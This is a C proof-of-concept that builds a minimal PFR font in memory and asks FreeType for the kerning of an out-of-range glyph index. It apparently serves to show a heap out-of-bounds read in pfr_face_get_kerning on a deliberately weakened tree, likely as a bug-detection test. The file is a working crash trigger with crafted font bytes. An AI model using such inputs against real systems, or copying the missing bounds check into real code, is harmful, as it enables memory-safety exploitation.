/* PoC: out-of-bounds read in pfr_face_get_kerning via FT_Get_Kerning.
 *
 * Builds a minimal valid PFR font (one physical font, one character) in
 * memory, loads it through the public API (FT_New_Memory_Face), and then
 * asks for the kerning of a glyph index that is one past the last valid
 * glyph.  On a tree whose glyph-index bounds check is correct this returns
 * zero kerning; on the patched tree it reads one entry past the
 * heap-allocated character array, which AddressSanitizer reports.
 */

#include <ft2build.h>
#include FT_FREETYPE_H

#include <string.h>
#include <stdio.h>

static unsigned char  font[128];

static void put8 ( int off, unsigned v ) { font[off] = (unsigned char)v; }

static void put16( int off, unsigned v )
{
  font[off + 0] = (unsigned char)( v >> 8 );
  font[off + 1] = (unsigned char)( v );
}

static void put24( int off, unsigned v )
{
  font[off + 0] = (unsigned char)( v >> 16 );
  font[off + 1] = (unsigned char)( v >> 8 );
  font[off + 2] = (unsigned char)( v );
}

static void put32( int off, unsigned v )
{
  font[off + 0] = (unsigned char)( v >> 24 );
  font[off + 1] = (unsigned char)( v >> 16 );
  font[off + 2] = (unsigned char)( v >> 8 );
  font[off + 3] = (unsigned char)( v );
}

static void
build_font( void )
{
  memset( font, 0, sizeof ( font ) );

  /* ---- PFR header (58 bytes) ---- */
  put32( 0, 0x50465230 );   /* signature  "PFR0"       */
  put16( 4, 0 );            /* version                 */
  put16( 6, 0x0D0A );       /* signature2 CR/LF        */
  put16( 8, 58 );           /* header_size             */
  put16( 10, 7 );           /* log_dir_size            */
  put16( 12, 58 );          /* log_dir_offset          */
  put16( 14, 18 );          /* log_font_max_size       */
  put24( 16, 18 );          /* log_font_section_size   */
  put24( 19, 65 );          /* log_font_section_offset */
  put16( 22, 33 );          /* phy_font_max_size       */
  put24( 24, 33 );          /* phy_font_section_size   */
  put24( 27, 83 );          /* phy_font_section_offset */
  put16( 30, 0 );           /* gps_max_size            */
  put24( 32, 0 );           /* gps_section_size        */
  put24( 35, 116 );         /* gps_section_offset      */
  put16( 52, 1 );           /* num_phy_fonts           */
  put16( 56, 1 );           /* max_chars               */

  /* ---- logical font directory (offset 58) ---- */
  put16( 58, 1 );           /* num_log_fonts           */
  put16( 60, 18 );          /* entry[0].size           */
  put24( 62, 65 );          /* entry[0].offset         */

  /* ---- logical font record (offset 65, 18 bytes) ---- */
  /* matrix[0..3] (3 bytes each) + flags left at zero    */
  put16( 78, 33 );          /* phys_size               */
  put24( 80, 83 );          /* phys_offset             */

  /* ---- physical font record (offset 83, 33 bytes) ---- */
  put16( 83, 1 );           /* font_ref_number         */
  put16( 85, 1000 );        /* outline_resolution      */
  put16( 87, 1000 );        /* metrics_resolution      */
  put16( 89, 0 );           /* bbox.xMin               */
  put16( 91, 0 );           /* bbox.yMin               */
  put16( 93, 1000 );        /* bbox.xMax               */
  put16( 95, 1000 );        /* bbox.yMax               */
  put8 ( 97, 0 );           /* flags                   */
  put16( 98, 0 );           /* standard_advance        */
  put24( 100, 0 );          /* num_aux                 */
  put8 ( 103, 0 );          /* num_blue_values         */
  put8 ( 104, 0 );          /* blue_fuzz               */
  put8 ( 105, 0 );          /* blue_scale              */
  put16( 106, 0 );          /* vertical.standard       */
  put16( 108, 0 );          /* horizontal.standard     */
  put16( 110, 1 );          /* num_chars               */
  /* char[0] (offset 112, 4 bytes) */
  put8 ( 112, 0x41 );       /* char_code               */
  put8 ( 113, 1 );          /* gps_size                */
  put16( 114, 1 );          /* gps_offset (non-zero)   */
}

int
main( void )
{
  FT_Library  library;
  FT_Face     face;
  FT_Vector   kern;
  FT_UInt     bad_glyph;


  build_font();

  if ( FT_Init_FreeType( &library ) )
    return 2;

  if ( FT_New_Memory_Face( library, font, (FT_Long)sizeof ( font ), 0, &face ) )
    return 2;

  /* valid glyph indices are 0 .. num_glyphs-1; the last valid character  */
  /* glyph is num_glyphs-1, so num_glyphs is the first out-of-range index */
  bad_glyph = (FT_UInt)face->num_glyphs;

  FT_Get_Kerning( face, bad_glyph, 1, FT_KERNING_UNSCALED, &kern );

  printf( "kerning = (%ld, %ld)\n", (long)kern.x, (long)kern.y );

  FT_Done_Face( face );
  FT_Done_FreeType( library );

  return 0;
}
